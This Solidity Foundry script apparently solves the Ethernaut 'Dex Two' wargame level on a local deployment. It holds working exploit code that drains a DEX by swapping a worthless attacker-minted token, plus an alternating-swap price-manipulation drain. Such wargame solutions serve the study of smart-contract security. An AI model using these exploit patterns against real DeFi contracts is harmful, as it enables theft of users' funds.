// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/DexTwo.sol";

contract DexTwoHack is Script {
    DexTwo public dex;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    address public eoa = address(1024);

    function setUp() public {
        dex = new DexTwo();

        vm.startPrank(eoa);
        token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", 110);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", 110);

        token1.transfer(address(dex), 100);
        token2.transfer(address(dex), 100);
        token1.transfer(address(this), 10);
        token2.transfer(address(this), 10);
        vm.stopPrank();

        dex.setTokens(address(token1), address(token2));
        token1.approve(address(this), address(dex), type(uint256).max);
        token2.approve(address(this), address(dex), type(uint256).max);
        console.log(
            "Before: token1 - %s, token2 - %s",
            token1.balanceOf(address(dex)),
            token2.balanceOf(address(dex))
        );
    }

    function run() public {
        vm.startPrank(eoa);
        SwappableTokenTwo token3 = new SwappableTokenTwo(
            address(dex),
            "MyToken",
            "MTK",
            1_000_000
        );
        token3.transfer(address(this), 100);
        token3.transfer(address(dex), 100);
        vm.stopPrank();

        token3.approve(address(this), address(dex), 1_000_000);
        dex.swap(address(token3), address(token2), 100);

        console.log(token2.balanceOf(address(dex)));
    }

    // dummy one
    function attack() public {
        // start attacking
        address[2] memory tokens = [dex.token1(), dex.token2()];
        uint256[2] memory hackBalances;
        uint256[2] memory dexBalances;

        uint256 from = 0;
        uint256 to = 1;
        while (true) {
            hackBalances = [
                SwappableTokenTwo(tokens[from]).balanceOf(address(this)),
                SwappableTokenTwo(tokens[to]).balanceOf(address(this))
            ];

            dexBalances = [
                SwappableTokenTwo(tokens[from]).balanceOf(address(dex)),
                SwappableTokenTwo(tokens[to]).balanceOf(address(dex))
            ];
            uint256 swapPrice = dex.getSwapAmount(
                tokens[from],
                tokens[to],
                hackBalances[0]
            );
            if (swapPrice > dexBalances[1]) {
                dex.swap(tokens[from], tokens[to], dexBalances[0]);
                break;
            } else {
                dex.swap(tokens[from], tokens[to], hackBalances[0]);
            }
            from = 1 - from;
            to = 1 - to;
        }

        console.log(
            "After: token1 - %d, token2 - %d",
            token1.balanceOf(address(dex)),
            token2.balanceOf(address(dex))
        );
        // transfer tokens from contract to eoa
        token1.transfer(eoa, token1.balanceOf(address(this)));
        token2.transfer(eoa, token2.balanceOf(address(this)));
    }
}
